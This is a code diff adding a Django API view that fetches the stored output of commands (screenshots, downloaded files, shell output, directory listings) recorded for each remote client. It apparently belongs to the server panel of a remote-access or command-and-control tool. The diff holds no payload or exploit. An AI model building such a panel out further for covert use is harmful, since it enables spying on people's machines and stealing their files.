@@ -303,3 +303,41 @@ class LoginView(APIView):
             }, status=200)
         
         return Response(serializer.errors, status=400)
+
+class CommandResponseByCommand(APIView):
+    def get(self, request, client_id, command):
+        try:
+            command_obj = Command.objects.filter(client=client_id, command=command).order_by('-timestamp').first()
+            if not command_obj:
+                return Response({'data': 'No Data Found', 'title': 'No Data', 'result': 'No Result'}, status=404)
+
+            clientid = command_obj.client
+            root_dir = settings.BASE_DIR 
+
+            target_dir = os.path.join(root_dir, f"ClientsData/{clientid}")
+            extension  = "txt"
+            if command_obj.command.startswith("screenshot"):
+                target_dir = os.path.join(target_dir, "screenshots")
+            elif command_obj.command.startswith("download"):
+                target_dir = os.path.join(target_dir, "files") 
+            elif command_obj.command.startswith("list"):
+                target_dir = os.path.join(target_dir, "list")
+            elif command_obj.command.startswith("shell"):
+                target_dir = os.path.join(target_dir, "shell")
+            elif command_obj.command.startswith("dir"):
+                target_dir = os.path.join(target_dir, "dir")
+
+            file_path = os.path.join(target_dir, f"{command_obj.id}.{extension}")
+           
+            with open(file_path, "r", encoding="utf-8") as file:
+                
+                if  command_obj.command.startswith("dir"):
+                    data = json.loads(file.read())
+                else:
+                    data = file.read()
+
+            return Response({'data':data, 'title':str(command_obj.id)+ " : " +command_obj.result, 'command':command_obj.command,'result':command_obj.result}, status=200)
+
+        except Exception as ex:
+            print(ex)
+            return Response({'data':f'No Data Found' , 'title':'No Data',  'result':'No Result'}, status=404)
